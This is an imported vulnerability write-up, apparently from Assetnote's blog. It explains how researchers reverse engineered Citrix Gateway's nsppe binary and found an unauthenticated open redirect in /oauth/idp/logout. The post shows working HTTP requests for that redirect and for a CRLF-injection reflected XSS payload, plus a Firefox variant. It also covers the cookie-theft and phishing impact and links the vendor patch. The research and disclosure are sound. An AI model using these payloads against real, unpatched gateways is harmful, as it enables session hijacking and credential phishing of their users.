---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-29_reversing-citrix-gateway-for-xss.md
original_filename: 2023-06-29_reversing-citrix-gateway-for-xss.md
title: Reversing Citrix Gateway for XSS
category: documents
detected_topics:
- xss
- oauth
- sso
- idor
- command-injection
- rate-limit
tags:
- imported
- documents
- xss
- oauth
- sso
- idor
- command-injection
- rate-limit
language: en
raw_sha256: fa755d28c1e6eb54601a9f00aaad564a9bec8967142c485a150d6627b1d14513
text_sha256: cad750ae5ce816ebb79e2c69293f2ba57f89b6141868ad011a293ba82857c62b
ingested_at: '2026-06-28T07:32:22Z'
sensitivity: unknown
redactions_applied: false
---

# Reversing Citrix Gateway for XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-29_reversing-citrix-gateway-for-xss.md
- Source Type: markdown
- Detected Topics: xss, oauth, sso, idor, command-injection, rate-limit
- Ingested At: 2026-06-28T07:32:22Z
- Redactions Applied: False
- Raw SHA256: `fa755d28c1e6eb54601a9f00aaad564a9bec8967142c485a150d6627b1d14513`
- Text SHA256: `cad750ae5ce816ebb79e2c69293f2ba57f89b6141868ad011a293ba82857c62b`


## Content

---
title: "Reversing Citrix Gateway for XSS"
url: "https://blog.assetnote.io/2023/06/29/binary-reversing-citrix-xss/"
final_url: "https://www.assetnote.io/resources/research/reversing-citrix-gateway-for-xss"
authors: ["Dylan Pindur"]
programs: ["Citrix Systems"]
bugs: ["Reflected XSS", "Open redirect", "Reverse engineering"]
publication_date: "2023-06-29"
added_date: "2023-07-03"
source: "pentester.land/writeups.json"
original_index: 992
---

[Research Notes](/resources/research)

Security Research

June 29, 2023

# Reversing Citrix Gateway for XSS

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

One of the targets we looked at late last year was Citrix Gateway. Citrix Gateway is another of these “all-in-one” network devices, combining a load balancer, firewall, VPN, etc. Older versions of this product were sold under the name “NetScaler”. In this case we were only looking at the VPN component (Citrix Gateway). A quick search at the time of writing yielded about ~50,000 instances of Citrix Gateway were publicly accessible. So even a smaller issue like cross-site scripting has a potentially huge impact.

During our research we discovered an open redirect vulnerability which was exploitable without authentication. We were also able to pivot this into CRLF injection leading to XSS or potentially cache poisoning if Citrix Gateway is deployed in such a configuration. For those who are concerned please don’t hesitate to update your deployments, the patch details are available [here](https://support.citrix.com/article/CTX477714/citrix-adc-and-citrix-gateway-security-bulletin-for-cve202324487-cve202324488). Just before writing this post we did a quick scan of a hundred Citrix Gateway instances and found over half were still unpatched.

## Understanding Citrix Gateway

Citrix Gateway is a FreeBSD derivative with several extensions, including a custom network stack. A significant portion of the application (including this network stack) is packed into a what is called the Netscaler Packet Processing Engine (nsppe).

Not knowing this ahead of time made reversing initially a bit puzzling as common techniques don’t work as expected. For example, since we were targeting a web service, an easy starting point is to find what process is listening on the port and then work backwards from there. But if we ran <span class="code_single-line">sockstat</span> (a FreeBSD utility similar to <span class="code_single-line">netstat</span>), we got the following:
  
  
  root@ns# sockstat -4 -l
  USER  COMMAND  PID  FD PROTO  LOCAL ADDRESS  FOREIGN ADDRESS  
  nsmonitor nsumond  831  6  tcp4  127.0.0.1:3013  *:*
  root  snmpd  615  10 tcp4  127.0.0.1:3335  *:*
  root  snmpd  615  20 udp4  192.168.1.90:161  *:*
  root  snmpd  615  21 udp4  127.0.0.1:161  *:*
  root  nscertforg 613  3  tcp4  127.0.0.1:15555  *:*
  root  aslearn  611  11 tcp4  127.0.0.1:3020  *:*
  root  iked  607  6  udp4  192.168.1.90:500  *:*
  root  iked  607  7  udp4  127.0.0.1:500  *:*
  root  iked  607  8  udp4  192.168.1.90:4500  *:*
  root  iked  607  9  udp4  127.0.0.1:4500  *:*
  root  iked  607  10 tcp4  127.0.0.1:8888  *:*
  root  nsaaad  602  3  tcp4  127.0.0.1:8766  *:*
  root  nskrb  598  3  tcp4  127.0.0.1:8788  *:*
  root  php  543  3  tcp4  127.0.0.1:9999  *:*
  root  imi  529  5  tcp4  *:4001  *:*
  root  imi  529  6  tcp4  127.0.0.1:3001  *:*
  root  nsconfigd  516  10 tcp4  *:3010  *:*
  root  nsclusterd 480  5  tcp4  127.0.0.1:7001  *:*
  root  nsclusterd 480  6  tcp4  127.0.0.1:7002  *:*
  root  nsclusterd 480  7  tcp4  127.0.0.1:7003  *:*
  root  nsclusterd 480  8  udp4  *:*  *:*
  root  nsaggregat 478  3  tcp4  127.0.0.1:5555  *:*
  root  nsmap  476  5  tcp4  127.0.0.1:3014  *:*
  nobody  httpd  284  4  tcp4  *:80  *:*
  nobody  httpd  284  5  tcp4  127.0.0.1:81  *:*
  nobody  httpd  283  4  tcp4  *:80  *:*
  nobody  httpd  283  5  tcp4  127.0.0.1:81  *:*
  nobody  httpd  282  4  tcp4  *:80  *:*
  nobody  httpd  282  5  tcp4  127.0.0.1:81  *:*
  nobody  httpd  281  4  tcp4  *:80  *:*
  nobody  httpd  281  5  tcp4  127.0.0.1:81  *:*
  nobody  httpd  280  4  tcp4  *:80  *:*
  nobody  httpd  280  5  tcp4  127.0.0.1:81  *:*
  root  sshd  213  4  tcp4  *:22  *:*
  root  httpd  207  4  tcp4  *:80  *:*
  root  httpd  207  5  tcp4  127.0.0.1:81  *:*
  root  syslogd  197  6  udp4  127.0.0.1:514  *:*
  
  

Note that the Citrix Gateway service we were looking for is accessed on port 443. A port which doesn’t appear in the above list at all. Because Citrix Gateway uses its own network stack, it doesn’t necessarily populate the structures used by tools like <span class="code_single-line">sockstat</span> in the way a vanilla FreeBSD installation would.

Looking through the documentation and searching online we did find that if we drop out of the <span class="code_single-line">bash</span> shell and into the provided Citrix Gateway command shell, there are command we can run that give us some information.
  
  
  > show ns connectiontable -Listen
  NAME  IP  PORT  SVCTYPE  Traffic Domain 
  INTERNAL  127.0.0.1  0  ROUTE  0  
  INTERNAL  192.168.1.90  0  TCP  0  
  INTERNAL  192.168.1.90  0  ANY  0  
  INTERNAL  fe80::20c:29ff:feae:24c2  0  TCP  0  
  INTERNAL  fe80::20c:29ff:feae:24c2  0  ANY  0  
  INTERNAL  ::1  0  ROUTE  0  
  INTERNAL  0.0.0.0  520  RIP  0  
  INTERNAL  127.0.0.1  5000  RPCSVR  0  
  INTERNAL  192.168.1.90  520  RIP  0  
  INTERNAL  192.168.1.90  21  FTP  0  
  INTERNAL  fe80::20c:29ff:feae:24c2  21  FTP  0  
  INTERNAL  192.168.1.90  161  SNMP  0  
  INTERNAL  fe80::20c:29ff:feae:24c2  4001  TCP  0  
  INTERNAL  fe80::20c:29ff:feae:24c2  161  SNMP  0  
  INTERNAL  192.168.1.90  179  ANY  0  
  ns_int_ulf 127.0.0.2  5557  0  
  ns_int_tcp 127.0.0.2  53  DNS_TCP  0  
  ns_int_nam 127.0.0.2  53  DNS  0  
  INTERNAL  192.168.1.91  443  UNKNOWN  0  
  Gateway  192.168.1.91  443  SSL  0  
  nshttps-12 192.168.1.90  443  SSL  0
  
  

However, this still doesn’t give us much to go on. At this stage, we were feeling a bit lost. And with not much else to go on, we started searching for any manuals or documentation on the Citrix Gateway and NetScaler operating system architecture to try and understand how the device works. After browsing through quite a few leaked slide decks and unofficial blog posts, we had a rough idea of how Citrix Gateway worked. We knew at the very least, that auditing <span class="code_single-line">nsppe</span> was probably where we should start.

An interesting quirk of the Gateway component being bundled with the network stack in this <span class="code_single-line">nsppe</span> binary is that any debugging must be done over the console. You can imagine why this is the case, setting a breakpoint while in an SSH session will sever the connection since no more packet processing to support the SSH session can occur while the process is suspended. As such, most of the analysis was performed offline by reading the code rather than through interactive debugging.

## Enumeration Adventures with Ghidra

We found the binary at <span class="code_single-line">/netscaler/nsppe</span> and it was frustratingly large, coming in at 42MB. We copied off the binary and decompiled with Ghidra, but unfortunately, decompilation failed on a number of key functions. We had more success after bumping up the decompiler resources under Edit -> Tool Options -> Decompiler to the following.

  * Cache Size (Functions): 2048
  * Decompiler Max-Payload (Mbytes): 512
  * Decompiler Timeout (seconds): 900
  * Max Instructions per Function: 3000000

We left Ghidra decompiling for an hour or so over lunch and came back to find everything successfully decompiled. Saving each function to a .c file gave us ~300MB of code to audit! Which was a lot, but at least we had somewhere to start now.

We proceeded to grep through the code for any string that resembled a URL (ASCII text, separated by slashes). We combined this with browsing around our own instance of Citrix Gateway and instances online, as different configurations and versions yielded slightly different login pages. Lastly, we also read through more configuration documentation from Citrix. Combining these three techniques we had a decently sized list of endpoints to enumerate.

We went through each endpoint on the list and tried prodding it with Burp to see if Citrix Gateway would actually respond, and if so, how. Some endpoints worked, some didn’t. We searched the code for references either to the endpoints we were hitting, or for strings we were seeing in the response. For example, if an endpoint redirected us to <span class="code_single-line">/vpn/tmlogout.html</span>, we’d search the code for <span class="code_single-line">/vpn/tmlogout.html</span>.

One function we eventually found was <span class="code_single-line">ns_vpn_process_unauthenticated_request</span>. As you can probably guess by the name, quite a few endpoints we were searching for lead us back to this function. And the fact that it was named as “unauthenticated” was encouraging as we were looking for pre-authentication vulnerabilities.

A big problem we had been facing up until this point is that it wasn’t really clear how the path routing was being performed. We could see a lot of URLs in the binary, but most were either in log messages or response payloads such as a hardcoded string containing an XML response payload that included URLs. While digging through <span class="code_single-line">ns_vpn_process_unauthenticated_request</span> we realised that Ghidra had failed to identify many compiler optimised string comparisons. In <span class="code_single-line">ns_vpn_process_unauthenticated_request</span> we found many instances of the following pattern.
  
  
  if ((((ulong)*(undefined8 *******)pBVar3 | 0x2020202020202020) == 0x687475612f666e2f) &&
  (((ulong)(pBVar3->RR).d | 0x2020202020202020) == 0x657774726174732f)) {
  bVar48 = (*(ulong *)&(pBVar3->RR).top | 0x2020202020202020) != 0x6f642e7765697662;
  }
  if (!bVar48) {
  uVar37 = ns_aaa_start_webview_for_authv3((long)local_50,(long)local_48);
  pBVar39 = (BN_MONT_CTX *)(uVar37 & 0xffffffff);
  goto LAB_0073f539;
  }
  
  

An <span class="code_single-line">if</span> statement with several comparisons where every byte is OR’d with <span class="code_single-line">0x20</span> followed by some kind of response handler, in the case above <span class="code_single-line">ns_aaa_start_webview_for_authv3</span>. Hovering over the hexadecimal comparison value Ghidra would helpfully display the <span class="code_single-line">char[]</span> representations. Which for the above is the following three values.

  * <span class="code_single-line">0x687475612f666e2f -> htua/fn/</span>

  * <span class="code_single-line">0x657774726174732f -> ewtrats/</span>

  * <span class="code_single-line">0x6f642e7765697662 -> od.weivb</span>

If we byte-reverse this we get:

  * <span class="code_single-line">0x687475612f666e2f -> /nf/auth</span>

  * <span class="code_single-line">0x657774726174732f -> /startwe</span>

  * <span class="code_single-line">0x6f642e7765697662 -> bview.do</span>

We had finally figured out how path routing was performed and why it was so difficult to search for. The compiler had inlined these short string comparisons to several equality checks rather than calling a separate function. The <span class="code_single-line">| 0x20</span> pattern was a bit-fiddling trick to lowercase the input. Lowercase ASCII letters are 32 bytes (0x20) ahead of their capital counterparts. OR’ing with <span class="code_single-line">0x20</span> is an easy way to convert any uppercase letters to lowercase, while keeping all the existing lowercase letters the same.

## Finding the Cross-Site Scripting

Now that we had a much better understanding of what was going on, we were able to uncover more unauthenticated endpoints to enumerate. And we wouldn’t have to do quite as much searching to figure out where the code was to handle them. One endpoint we found was <span class="code_single-line">/oauth/idp/logout</span>. Looking at the routing code we had the following in <span class="code_single-line">ns_vpn_process_unauthenticated_request</span>.
  
  
  if (((((ulong)*(undefined8 *******)pBVar3 | 0x2020202020202020) == 0x692f687475616f2f)
  && (((ulong)(pBVar3->RR).d | 0x2020202020202020) == 0x756f676f6c2f7064)) &&
  ((*(byte *)&(pBVar3->RR).top | 0x20) == 0x74)) {
  uVar37 = ns_aaa_oauth_fetch_logout_url(0,(long)pBVar3,(uint)uVar8);
  vpn_location_url_len = (int)uVar37;
  if (vpn_location_url_len < 1) {
  vpn_location_url = "/vpn/tmlogout.html";
  vpn_location_url_len = 0x12;
  uVar14 = 0x880002;
  }
  else {
  vpn_location_url = (char *)tmpbuf512;
  uVar14 = 0x880002;
  }
  goto LAB_0073da38;
  }
  
  

<span class="code_single-line">/vpn/tmlogout.html</span> is what we kept seeing as the <span class="code_single-line">Location</span> header of the response. In the code above it looks like that is the default value, but otherwise it is set to <span class="code_single-line">tmpbuf512</span>. Diving into the decompiled output for <span class="code_single-line">ns_aaa_oauth_fetch_logout_url</span> we found the following helpful log message. The snippet <span class="code_single-line">missing post_logout_redirect_uri</span> caught our attention.
  
  
  ...
  if (0x484 < uVar2) {
  __format = "%s : OauthIDP logout request failed to extract redirect URI: missing post_logout_redirect_uri  %.*s for %.*s";
  LAB_0061f124:
  uVar2 = snprintf(large_auditlog_message,0x3fff,__format,"ns_aaa_oauth_fetch_logout_url",
  (ulong)param_3,param_2,uVar3,lVar5);
  goto LAB_0061f13e;
  }
  ...
  
  

Playing around with this endpoint in Burp, we identified the query parameter <span class="code_single-line">post_logout_redirect_uri</span>. Given the name of the parameter, and what we knew about this function, it seemed a good candidate for an open redirect vulnerability. We tried out our theory and were happy to have found our first vulnerability, an open redirect.
  
  
  GET /oauth/idp/logout?post_logout_redirect_uri=attacker.com HTTP/1.1
  Host: 192.168.1.91
  
  HTTP/1.1 302 Object Moved
  Location: attacker.com
  X-Content-Type-Options: nosniff
  X-XSS-Protection: 1; mode=block
  Connection: close
  Content-Length: 0
  Cache-control: no-cache, no-store, must-revalidate
  Pragma: no-cache
  Content-Type: text/html; charset=utf-8
  
  

As we saw so much raw memory handling and copying in our analysis (both here and elsewhere). We thought it prudent to double check the parameter for CRLF injection and found we were able to pivot this into a reflected cross-site scripting attack too. By inserting two newlines (<span class="code_single-line">%0d%0a%0d%0a</span>) at the start to prematurely end the HTTP headers and start inserting HTML content.
  
  
  GET /oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.cookie)</script> HTTP/1.1
  Host: 192.168.1.91
  
  HTTP/1.1 302 Object Moved
  Location: 
  
  <script>alert(1)</script>
  X-Content-Type-Options: nosniff
  X-XSS-Protection: 1; mode=block
  Connection: close
  Content-Length: 0
  Cache-control: no-cache, no-store, must-revalidate
  Pragma: no-cache
  Content-Type: text/html; charset=utf-8
  
  

In Chrome this is an immediate XSS, Firefox handles a blank <span class="code_single-line">Location</span> header a little differently. A working payload for Firefox is <span class="code_single-line">ws://localhost/x%0D%0A%0D%0A<script>alert(1)</script></span>.

## Impact

With this vulnerability we’re able to trivially redirect users to a phishing page which mirrors the Citrix Gateway logon screen to steal credentials. Alternatively, we can execute arbitrary JavaScript in the victim’s browser. Citrix Gateway appears to be pretty lax about session cookies, <span class="code_single-line">HttpOnly</span> is not often set. As such, stealing the session cookie is trivial, as shown below.

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a37808484dfba71b498dad_citrix-xss-auth-cookie-alert.png)

Even if OAuth is neither enabled nor configured, the vulnerable endpoint is still available. And as mentioned at the beginning, Citrix Gateway is widely deployed and at the time of this article, often unpatched. This leads to a huge number of public, affected hosts.

## Conclusion

Some key learnings from this research center around really understanding how a particular application is architected. Especially if the operating system is not running a stock version of Linux / BSD, even though, on the face of it, the OS appears unmodified. The same goes for tooling like Ghidra and understanding how it handles compiler optimisations, which may obscure what the code is actually trying to achieve, as was the case with the string comparisons. Lastly, don’t discount little things like CRLF injection. When dealing with devices that aren’t running a standard web server, it pays to try out these techniques that ordinarily have built in protections.

There’s still a lot more to look at in Citrix Gateway, we’ve only just scratched the surface. And with such a wide deployment base even little vulnerabilities can have a big impact.

To remediate this vulnerability, upgrading to the latest version of Citrix Gateway is recommended. For the for list of affected versions please see Citrix’s security bulletin [here](https://support.citrix.com/article/CTX477714/citrix-adc-and-citrix-gateway-security-bulletin-for-cve202324487-cve202324488).

And, as always, customers of our [Attack Surface Management](https://assetnote.io/) platform were the first to know when this vulnerability affected them. We continue to perform original security research in an effort to inform our customers about zero-day vulnerabilities in their attack surface.

Written by:

Dylan Pindur

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
